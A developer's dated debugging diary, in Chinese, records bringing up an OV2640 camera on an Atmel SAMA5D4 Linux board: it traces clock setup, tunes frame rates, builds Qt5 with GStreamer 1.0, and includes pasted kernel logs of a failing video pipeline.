		R_DVP_SP的pclk分频设置为4,此消彼长,pclk保持原来,但是输出正常,而且 每帧34ms 每秒29.4帧
	从中还发现:
		pclk不能太高,输出会失真
		vsync 信号代表每帧图片传输需要的时间,采集320x240 与采集640x480 的帧传输时间不变
		更一层说,pclk的周期大小,不影响 vsync周期大小!!!!
		芯片的工作时钟越快, vsync信号周期越短,图片质量也越差,但是,pclk的改变,并不会影响vsync改变
改变pclk 并不会,因此改变vsync信号周期 而让输出图片帧速率发生改变,
	因为,相对应的 href信号里,亢余信号段会自动延长,使能信号段会自动减少,
	改变vsync FLL,FLH寄存器显著改变的的是vsync的启动信号(无效信号)长度,也稍微改变有效信号的长度
		原来 FLL 0x22, vsync周期44ms 启动信号 2ms 有效信号42ms
		后来 FLL 0xff, vsync周期 > 60ms, 启动信号 >10ms 有效信号41ms  
	改变vsync ADDVSH,ADDVSL寄存器 改变了vsync信号有效信号的电平,并没有改变vsync的周期
	改变REG2A,FRARL,HSDY,HEDY 可以用于改编 vsync HREF 信号,从而改编 帧数率,
		然而他们的修改帧速率的做法是增加vsync默认信号的周期!!!,而没有缩减vsync默认信号周期的做法!!
也就说,默认状态下,vsync信号周期是与 ov2640 的运行时钟频率有关系,例如 
	18mhz工作时钟下, vsync周期为 82mhz 输出帧速率就是11帧左右
	36mhz工作时钟下, vsync周期为 44mhz 输出帧速率就是22帧左右
	48mhz工作时钟下, vsync周期为 34mhz 输出帧速率接近30帧左右
	这些都是对应当前芯片工作频率所可以达到的最快帧速率,不论是输出640X480分辨率格式的图片,还是320x240格式
	href信号的亢余信号段分配会根据 vsync信号周期和pclk周期而自动分配
	而其他修改寄存器影响帧速率的操作,只会提高帧速率,而不会缩小帧速率
然而新的问题是datasheet说过 cif格式图片帧速率可以达到60fps,但是48mhz下的vsync说明最大也只是30fps,矛盾??
	驱动代码COM7寄存器说明,芯片时钟运行在 uxga模式(全像素点进行采集的模式)!!!(感觉不论是采集640x480,还是320x240
	
现在知道!!要改变芯片的延时问题,最根本还是要让 mpu 改变输出的xvclk时钟频率
添加内核追踪:
添加头文件:
    #include <linux/kprobes.h>
    #include <asm/traps.h> 
然后在需要向上跟踪函数调用关系里,添加 dump_stack();
int xxxx()
{
	...
	 dump_stack();
	...
}
发现 clk-sam9x5_peripheral_enable() 并不是开启 xvclk 输出时钟信号的开关,而是直接去启动i2c内部时钟准备与ov2640通讯
但是没有 xvclk 输出时钟信号 ov2640 并不工作,跟不用说 与 mpu i2c通讯了!!!!!
所以 xvclk 应该先于此设置并工作起来!!
从 ov2640_hw_power 开始追溯 priv->ssdd_dt.power = ov2640_hw_power
设置时钟! priv->clk 是 v4l2_clk
关于xvclk输出时钟:mpu的datasheet有写:The sensor master clock (ISI_MCK) can be generated either by the Advanced Power Management Controller
(APMC) through a Programmable Clock output
然后 dump_stack clk-programmer.c 的函数,发现,在ov2640真正probe之前,注册了一个i2cadapter,而这个adaptor又调用了clk-programer的函数
	怀疑 xvclk 是在这里初始化的,但是xvclk是 isi 的输出时钟,居然在 i2c adaptor 这里初始化?
	把dts xvclk的设置的频率去掉了,然后就不出现调用 clk-programer的函数 是不是意味着没有初始化xvclk?
	使用自带时钟源的ov2640模块, 发现 把dts xvclk的设置的频率去掉的情况下 可以工作!!! 可以通i2c!!!!
	使用无自带时钟源ov2640模块, 发现 把dts xvclk的设置的频率去掉的情况下 不能工作!!!
	也就说,clk-programer设置了xvclk
但是设置xvclk的地方太诡异了,居然放在i2c注册adaptor时设置,而不是在 ov2640_probe 那里设置!!!
上述是设置了xvclk 的时钟频率,和输出管脚的设置,而真正打开时钟输出开关的在后面
还有一处:
	在之前,ov2640_video_probe 看到 ov2640_s_power 在 i2c_smbus_write_byte_data 之前!!
	就是说, ov2640_s_power 里的 v4l2_clk_enable -> clk_prepare_enable()
		->clk_enale->clk_core_enable 是xvclk时钟的输出开关!!! 
		而 clk_core_enable 里的 clk->ops.enable() 应该就是 真正的时钟源输出开关!!!
		但是并不知道 clk->ops.enable 所指向,于是尝试寻找了所有关于at91 的enable函数,发现都说不是!!
		然后在 clk->ops.enable() 旁加上了dump_stack, 发现原来这里的clk->ops.enable() 并没有执行!!
		后来想想,enable应该是让时钟运作起来,但是打开输出开关的事应该不是他干的!!!
		而且在之前的 clk-programmer已经使时钟运作起来!!!
		后来怀疑并没有执行 clk_enable 没做什么实质的事情, 所有启动输出的开关在 clk_prepare_enable() ->clk_prepare 就做了,果然!!
		在 clk_prepare_enable() ->clk_prepare ->clk_core_prepare -> clk->ops->prepare 即 at91的 clk_system_prepare 给做了!!
		而且很奇怪:
			pmc_write(pmc,AT91_PMC_SCER,mask);和 is_pck(sys->id),一起组合后, 才输出xvclk时钟
			单单 pmc_write(pmc,AT91_PMC_SCER,mask) 并不会触发时钟输出!!
			后来发现,pmc_write 打开了programmable-clk-output的开关,才输出时钟信号的,
			但是从打开开关,到有信号输出,需要一段时间,才有输出,如果打开了开关就马上进入while(1);死循环的话,信号也不会输出
			所以,就有连同is_pck一起执行后 再进入死循环,才看到输出的xvclk时钟!!!
几经波折终于找到了 xvclk信号输出开关!! 
	原来是在 clk_prepare里给做了,而不是 clk_enable 
	具体是clk-system.c 的 clk_system_prepare 的 pmc_write(pmc,AT91_PMC_SCER,mask) 打开的!!!
	之前一直找错了方向,你妹,驱动写成这样乱!!









20170316
开始设置时钟频率!!
注意 ov2640_video_probe 设置了 while(1);堵塞调试!! 
分析了clk-programmable.c
	recalc_rate () 检查时钟频率
	determine_rate() 获取要设置的信息
	set_parent 设置xvclk的父时钟源!!
	set_rate 设置时钟频率
经分析,的确输出 25mhz 时钟!!! 
	是通过 200mhz-masterclock 经过8分频得到的
	在linux启动初始化摄像头设置阶段也是设置好的25mhz, 
	但是为什么执行gst视频流时会降到18mhz??
更诡异的是 如果我设置输出 12.5mhz 时钟
	执行gst视频流时还是保持12.5mhz
	vsync信号周期65ms,输出15fps, 图片质量还贼好
如果我dts写20mhz 系统会设置最近20mhz的一个可设置频率 18.75mhz
	执行gst视频流时还是保持18.75mhz
如果我dts写30mhz 系统会设置最近20mhz的一个可设置频率 30mhz
	但是执行gst视频流时还是变回18.75mhz
终于找到了问题症结, 因为 ov2640 和 ov7670 都使用了 pck1 输出作为xvclk 但是ov2640设置频率25mhz,系统能设置为25mhz
	而ov7670 设置为24mhz,但是系统只能设置自认为最好的18.75mhz,于是pck1本来是25mhz又改回18.75mhz..我去
	也就说如果开发板要挂两个摄像头,要么分别用pck1 和pck2, 要么只用pck1 输出统一时钟频率
	另外,如果ov2640之所以我设置了12.5mhz 为什么后面ov7670没有改回到18.75mhz?是因为我是强制填参数得到12.5mhz,
		后面设置18mhz也用回了12.5mhz的硬参数,
	pck 是programmable clock 的缩写!!!
 
最后尝试设置 48mhz 系统默认最多只能得到37.5mhz 
	对于37.5mhz高频,ov2640 的clcrc 不倍频,R_DVP_SP 改回2 , 图像轻微失真
	默认帧速率是由 ov2640 的芯片的工作频率决定的, 至少暂时认识到的并不是由 pclk 和 采集图像的分辨率大小决定和修改的!!
		所以不管什么分辨率和pclk 默认输出的帧速率为 24fps
还有当芯片运行的时钟频率是 30mhz时 ,可输出15fps 而且感觉图片质量和速度都相当好

至此关于ov2640 的大体调试已经完成!!
小结:
	在linux上加载一个摄像头,其实加载多个驱动!!!
	首先是 摄像头由 i2c控制,所以加载一个i2c的从设备驱动 和一个isi的图像流接受设备驱动
	此外,涉嫌头芯片需要的有时钟源才能工作,然而这个设置时钟源的事情并不是让isi驱动做,
		而是让12c从设备驱动加载时,间接加载上,关系写得有点乱,
		而且加载时调用的函数名字意义与实际操作意义不一致,造成很多误会和追溯难题







20170317
重新移植 ov7670 ,取到了一块原厂的模块!!!
我去,原厂的模块也不能i2c读取!!!
好吧,接下来就是不强求读内容了,只完成写内容调试
	调试过程中不要在执行任何读操作!!!
	(搁置待续)








20170321
今天做一个qt摄像头嵌入式程序!!!
而且确认只使用qt5来做,而非qt4.7
qt5摄像头使用qtmultimedia 模块, 所以根文件系统要添加这个模块!!
buildroot 添加这个模块,在make menuconfig 的qt5 里有这个选项!!!
在qt5.6.2 使用的编译库也要添加这个模块
都加载后 ,执行一例子显示:
defaultServiceProvider::requestService(): no service found for - "org.qt-project.qt.camera"
据网络, 给profile文件添加qtdebug项得到调试信息
	export QT_DEBUG_PLUGINS=1
后来发现 程序好像这的是在找什么库似的,.没找到!!
网上说要添加 gstreamer补丁!! 
	root@wandboard-quad:/usr/local/Qt-5.1.1/plugins/mediaservice# ls
	libgstaudiodecoder.so  libgstmediacapture.so
	libgstcamerabin.so     libgstmediaplayer.so
首先,我们要建立的使用qt5 的摄像头程序,而国内多数是qt4.7的摄像头程序!!!
使用qt5 写摄像头,需要 使用qtmultimedia
还需要gstreamer补丁,补丁与gstreamer原程序不一样,
我们使用buildroot来集成qt到文件系统,buildroot默认集成qt5.6
我们查看 qtmultimedia.pro 发现是有编译gstreamer补丁的情况的 如果读取到 GST_VERSION 的信息!!
查看 /home/infortech-ubuntu-1404/SAMA5D4/sources/buildroot/buildroot1/buildroot/package/qt5/qt5multimedia/qt5multimedia.mk
发现builroot集成的qt5.6只支持 gstreamer1.0 ?? 不支持0.1???
所以还是要线测试 gstreamer1.0可用(暂时不可用,先不管)
出现问题:
ERROR: from element /GstPipeline:pipeline0/GstVov2640 0-0030: ov2640_hw_power: DISABLE the camera
4atmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 0
l2soc-camera-pdrv soc-camera-pdrv.0: camera device close
Src:v4l2src0: Internal data flow error.
Additional debug info:
gstbasesrc.c(2948): gst_base_src_loop (): /GstPipeline:pipeline0/GstV4l2Src:v4l2src0:
streaming task paused, reason not-negotiated (-4)
Execution ended after 0:00:00.511633760
Setting pipeline to PAUSED ...
Setting pipeline to READY ...
Setting pipeline to NULL ...
Freeing pipeline ...

gstreamer1.0 已经编译好,先假设可用,然后重新编译集成的qt5.6.2
先把 ouput/build里关于qt5的删掉,再重新make,不然却显示缺东西的错误
例如:libqgsttools 就是qtbase生成的,而不是qtmultimedia这个模块生成
	而libqgsttools 是否生成,还得跟 buildroot 是否集成编译了gstreamer1.0 有关系...
总之,编译通过了, 测试qt5 的camera 例程 可以打开dev/video0了可以执行i2c传输了!!!!
qt里也有gstreamer 的补丁了:libgstcamerabin.so 

接下来就是解决 gstreamer1.0 与摄像头的接口问题!!!!
先看回以前 gstreamer0.1 正常启动,正常输出log:
soc-camera-pdrv soc-camera-pdrv.0: set width: 640 height: 480
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge
atmel_isi f0008000.isi: queue_setup, count=2, size=614400
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd40a14a8
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb68a4000, size=614400, ret=0
soc-camera-pdrv soc-camera-pdrv.0: mmap called, vma=0xd40a1500
soc-camera-pdrv soc-camera-pdrv.0: vma start=0xb680e000, size=614400, ret=0
clk_sam9x5_peripheral_enable
Pipeline is live and does not need PREROLL ...
Setting pipeline to PLAYING ...
New clock: GstSystemClock

另外,
意外地找到了一个鼠标应用examples 官方可用,插入usb鼠标可以看到鼠标移动的实现!!!









20170322
研究gstreamer1.0 为何不行!!!
网络一参考调试gstreamer1.0的:
If you see a "streaming task paused, reason not-negotiated (-4)" then you've tried to link incompatible elements or some of the involved elements is not handling the caps correctly.
When using gst-launch, I would just do:
GST_DEBUG_DUMP_DOT_DIR=$PWD gst-launch-1.0 ...
and when it failed take the last generated *.dot file and render it
dot -Tsvg xxx.dot -o graph.svg
Open the svg and look at the connections and check where the caps are not negotiated. In your case I would get it is "fbdevsink".
Finally when posting logs, use GST_DEBUG_NO_COLOR=1 to have logs without color codes.
的确得到调试信息文件dot,但是暂时不会看
usb摄像头刚到,先尝试在 pc端上实现qt摄像头!!!再移植到开发板
	先安装gstreamer1.0到机子上:
	sudo apt-get install gstreamer1.0  gstreamer1.0-plugins-base gstreamer1.0-plugins-bad gstreamer1.0-plugins-good
	遇到失效的地址,使用
	sudo apt-get install ubuntu-restricted-extras
	安装了,也也成功代替和跳过一些失效的链接和包
	然而命令行的测试是失败的!!!!
	后来发现,输出端的设备不能是fbdevsink 因为fb0设备已经用作做桌面操作系统了,所以是ximagesink会模拟出一个图片窗口供显示!!
	gst-launch-1.0 v4l2src device="/dev/video0" ! video/x-raw,width=640,height=480 ! videoconvert ! ximagesink
重新编译QT5.6 (注意是针对pc版的):
./configure -release -opensource -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/linux-x86_64_2 -gstreamer 1.0
//-prefix  安装地址
//-gstreamer 1.0  表示将构建与 gstreamer 1.0 接口的qt功能模块 所以一定要checking for GStreamer 1.0, 如果检查到没有,就出错,
//-opensource 注册为开源用户
结果checking for GStreamer 1.0... no 直接出错!!,但明明把必要的模块都用上了
网上参考:
	安装所有gstreamer相关包
	gstreamer0.10-alsa                     gstreamer1.0-clutter                   gstreamer1.0-plugins-base-dbg
	gstreamer0.10-doc                      gstreamer1.0-clutter-3.0               gstreamer1.0-plugins-base-doc
	gstreamer0.10-ffmpeg                   gstreamer1.0-crystalhd                 gstreamer1.0-plugins-good
	gstreamer0.10-ffmpeg-dbg               gstreamer1.0-doc                       gstreamer1.0-plugins-good-dbg
	gstreamer0.10-gconf                    gstreamer1.0-dvswitch                  gstreamer1.0-plugins-good-doc
	gstreamer0.10-gnomevfs                 gstreamer1.0-espeak                    gstreamer1.0-plugins-ugly
	gstreamer0.10-nice                     gstreamer1.0-fluendo-mp3               gstreamer1.0-plugins-ugly-amr
	gstreamer0.10-plugins-base             gstreamer1.0-hybris                    gstreamer1.0-plugins-ugly-dbg
	gstreamer0.10-plugins-base-apps        gstreamer1.0-libav                     gstreamer1.0-plugins-ugly-doc
	gstreamer0.10-plugins-base-dbg         gstreamer1.0-libav-dbg                 gstreamer1.0-pocketsphinx
	gstreamer0.10-plugins-base-doc         gstreamer1.0-nice                      gstreamer1.0-pulseaudio
	gstreamer0.10-plugins-good             gstreamer1.0-packagekit                gstreamer1.0-tools
	gstreamer0.10-plugins-good-dbg         gstreamer1.0-plugins-bad               gstreamer1.0-vaapi
	gstreamer0.10-plugins-good-doc         gstreamer1.0-plugins-bad-dbg           gstreamer1.0-vaapi-doc
	gstreamer0.10-pulseaudio               gstreamer1.0-plugins-bad-doc           gstreamer1.0-x
	gstreamer0.10-qapt                     gstreamer1.0-plugins-bad-faad          gstreamer-qapt
	gstreamer0.10-tools                    gstreamer1.0-plugins-bad-videoparsers  gstreamer-tools
	gstreamer0.10-x                        gstreamer1.0-plugins-base              
	gstreamer1.0-alsa                      gstreamer1.0-plugins-base-apps         
	除了 gstreamer1.0-hybris有依赖问题无法安装外，都安装了，问题依然	
	又安装如下包	
	libgstreamer0.10-0                 libgstreamer1.0-dev                libgstreamer-ocaml-dev             
	libgstreamer-plugins-	base1.0-0
	libgstreamer0.10-0-dbg             libgstreamermm-1.0-0v5             libgstreamer-plugins-bad1.0-0      
	libgstreamer-plugins-	base1.0-dev
	libgstreamer0.10-dev               libgstreamermm-1.0-dev             libgstreamer-plugins-bad1.0-dev    
	libgstreamer-plugins-	good1.0-0
	libgstreamer1.0-0                  libgstreamermm-1.0-doc             libgstreamer-plugins-base0.10-0    
	libgstreamer-plugins-	good1.0-dev
	libgstreamer1.0-0-dbg              libgstreamer-ocaml                 libgstreamer-plugins-base0.10-dev  
	问题依然，搜索了好久
	./configure -gstreamer 1.0 -qt-xcb 问题依然
	 pkg-config gstreamer-1.0 --cflags 结果正常
	-pthread -I/usr/include/gstreamer-1.0 -I/usr/lib/x86_64-linux-gnu/gstreamer-1.0/include -I/usr/include/glib-2.0 
		-I/usr/lib/x86_64-	linux-gnu/glib-2.0/include
	pkg-config gstreamer-1.0 --libs 结果正常
	-lgstreamer-1.0 -lgobject-2.0 -lglib-2.0
	经过这篇文章提示，http://askubuntu.com/questions/384059/error-compiling-a-package-configure-error-no-gstreamer-1-0-1-0-0	
	仔细检查，果然是漏掉了 sudo apt install libgstreamer-plugins-base1.0-dev 安装
	安装完后，rm config.cache，重新./configure 终于检测结果正常开启 GStreamer 1.0
根据网上参考,添加
sudo apt install libgstreamer-plugins-base1.0-dev 
重新 ./configure 
成功检测到 checking for GStreamer 1.0... yes,最终成功配置
然后make -j8.....make install
然后配置qtcreator 添加一个新的配置,使用这个新编译qmake版本
重新编译 官方自带例子 multimediawidgets的camera 成功显示图像!!!!

另外,补充关于qt的./configure 的使用!!!
./configure -release -opensource -xplatform linux-arm-gnueabi-g++ -prefix /home/infortech-ubuntu-1404/SAMA5D4/sources/qt/qt-5.6.2/armv7-a -no-c++11 -qreal float
//-release 不明
//-opensource 开源
//-xplatfrom 选择编译器,默认不选,是系统安装的gcc g++,出来的文件是针对x86_64_pc,例如这里选了linux-arm-gnueabi-g++ 就是针对 arm架构的
//-prefix 安装路径
//-no-c++11 相反的是 -c++11 表示是否应用c++11的标准编译
//-gstreamer 1.0  表示会用到 gstreamer 的1.0 版本
另外在ubuntu部署 gstreamer
sudo apt-get install libgstreamer0.10-dev gstreamer-tools gstreamer0.10-tools gstreamer0.10-doc
sudo apt-get install gstreamer0.10-plugins-base gstreamer0.10-plugins-good gstreamer0.10-plugins-ugly gstreamer0.10-plugins-bad gstreamer0.10-plugins-bad-multiverse
apt-get install libgstreamer* // 该命令的目的是安装头文件；注意’*’









20170323
为了了解是不是streamer 的问题,给内核加上了usb 摄像头模块UVC
make ARCH=arm menuconfig:
	Device Drivers -> Multimedia support -> Media USB adapters -> USB Video Class (UVC) -> UVC input events device support
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
然后烧录,把ov2640 去掉, 挂上usb摄像头 ,开启板子,然后执行命令行
gst-launch-1.0 v4l2src device="/dev/video0" ! video/x-raw,width=640,height=480 ! videoconvert ! fbdevsink
成功显示!!虽然帧率比较低
然后绕到文件系统qt里自带的camera例子执行,也成功显示图像!!!!

这么说,问题应该就出在ov2640的驱动上!!!!
每次搜都是设置好后就主动关闭摄像头!!!你妹
然后把 ov2640 的的开关函数关于硬件关闭摄像头的部分关闭了!!!!
但是没用,查看log:
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge //至此完成soc_camera_set_fmt而且正确设置
soc-camera-pdrv soc-camera-pdrv.0: camera device open	//至此,完成了打开ov2640的步骤
//后来莫名其妙调动了soc_camera_close
ov2640 0-0030: ov2640_hw_power: DISABLE the camera
atmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 0	//soc_camera_close->soc_camera_remove_device->ops->remove(icd)
soc-camera-pdrv soc-camera-pdrv.0: camera device close			//至此soc_camera_close 完毕
//然后又是soc_camera_open
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0 //soc_camera_add_device
ov2640 0-0030: ov2640_hw_power: ENABLE the camera
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)

gstreamer1.0 失败log:
//soc_camera_open 
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0	//soc_camera_add_device
clk_system_prepare 
ov2640 0-0030: ov2640_hw_power: ENABLE the camera	//__soc_camera_power_on
//soc_camera_open 里的 soc_camera_set_fmt
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
//...i2c通讯
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge //至此完成soc_camera_set_fmt
soc-camera-pdrv soc-camera-pdrv.0: camera device open 	//至此,完成了 soc_camera_open 打开ov2640的步骤
//很突然执行了 soc_camera_close
ov2640 0-0030: ov2640_hw_power: DISABLE the camera	//__soc_camera_power_off
atmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 0 //soc_camera_remove_device
soc-camera-pdrv soc-camera-pdrv.0: camera device close  //至此,完成了 soc_camera_close
//很突然又执行了 soc_camera_open
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0
clk_system_prepare 
ov2640 0-0030: ov2640_hw_power: ENABLE the camera
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
//...i2c通讯
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge
soc-camera-pdrv soc-camera-pdrv.0: camera device open	//至此,完成了 soc_camera_open 打开ov2640的步骤
//很突然执行了 soc_camera_close
ov2640 0-0030: ov2640_hw_power: DISABLE the camera
atmel_isi f0008000.isi: Atmel ISI Camera driver detached from camera 0
soc-camera-pdrv soc-camera-pdrv.0: camera device close	//至此,完成了 soc_camera_close
//暂停pipeline
Setting pipeline to PAUSED ...
//很突然又执行了 soc_camera_open
atmel_isi f0008000.isi: Atmel ISI Camera driver attached to camera 0
clk_system_prepare 
ov2640 0-0030: ov2640_hw_power: ENABLE the camera
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 800x600)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 800x600)
ov2640 0-0030: ov2640_set_params: Selected cfmt YUYV (YUV422)
//...i2c通讯
soc-camera-pdrv soc-camera-pdrv.0: set width: 800 height: 600
atmel_isi f0008000.isi: Flags cam: 0x175 host: 0x1fd common: 0x175
atmel_isi f0008000.isi: vsync active high, hsync active high, sampling on pix clock rising edge
soc-camera-pdrv soc-camera-pdrv.0: camera device open	//至此,完成了 soc_camera_open 打开ov2640的步骤
//???
Pipeline is live and does not need PREROLL ...
Setting pipeline to PLAYING ...
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
New clock: GstSysoc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
stsoc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
esoc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
mClock
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(YUYV, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(UYVY, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 1x1)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: S_FMT(RGBP, 32768x32768)
soc-camera-pdrv soc-camera-pdrv.0: TRY_FMT(RGBP, 32768x32768)
